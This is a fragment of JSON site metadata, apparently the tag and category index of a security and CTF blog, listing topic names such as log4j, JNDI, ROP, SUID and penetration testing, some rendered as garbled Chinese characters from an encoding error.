"link":"/tags/sandbox/"},{"name":"æ¨¡æ¿æ³¨å…¥","slug":"æ¨¡æ¿æ³¨å…¥","link":"/tags/æ¨¡æ¿æ³¨å…¥/"},{"name":"HeapOverflow","slug":"HeapOverflow","link":"/tags/HeapOverflow/"},{"name":"IO_file","slug":"IO-file","link":"/tags/IO-file/"},{"name":"ORW","slug":"ORW","link":"/tags/ORW/"},{"name":"SUID","slug":"SUID","link":"/tags/SUID/"},{"name":"hackthebox","slug":"hackthebox","link":"/tags/hackthebox/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","link":"/tags/ååºåˆ—åŒ–/"},{"name":"JBoss","slug":"JBoss","link":"/tags/JBoss/"},{"name":"remoting","slug":"remoting","link":"/tags/remoting/"},{"name":"JVM","slug":"JVM","link":"/tags/JVM/"},{"name":"HotSpot","slug":"HotSpot","link":"/tags/HotSpot/"},{"name":"shellcode","slug":"shellcode","link":"/tags/shellcode/"},{"name":"RMI","slug":"RMI","link":"/tags/RMI/"},{"name":"å†…å­˜é©¬","slug":"å†…å­˜é©¬","link":"/tags/å†…å­˜é©¬/"},{"name":"CAP","slug":"CAP","link":"/tags/CAP/"},{"name":"mprotect","slug":"mprotect","link":"/tags/mprotect/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"NOPASSWD","slug":"NOPASSWD","link":"/tags/NOPASSWD/"},{"name":"è„ç‰›","slug":"è„ç‰›","link":"/tags/è„ç‰›/"},{"name":"åŸŸ","slug":"åŸŸ","link":"/tags/åŸŸ/"},{"name":"tomcat","slug":"tomcat","link":"/tags/tomcat/"},{"name":"Spring","slug":"Spring","link":"/tags/Spring/"},{"name":"ICMP","slug":"ICMP","link":"/tags/ICMP/"},{"name":"log4j","slug":"log4j","link":"/tags/log4j/"},{"name":"struts2","slug":"struts2","link":"/tags/struts2/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"}],"categories":[{"name":"PWN","slug":"PWN","link":"/categories/PWN/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"é¶æœº","slug":"é¶æœº","link":"/categories/é¶æœº/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","link":"/categories/ä»£ç å®¡è®¡/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","link":"/categories/æ¸—é€æµ‹è¯•/"},{"name":"æ—¥å¸¸","slug":"æ—¥å¸¸","link":"/categories/æ—¥å¸¸/"},{"name":"é€†å‘","slug":"é€†å‘","link":"/categories/é€†å‘/"}]}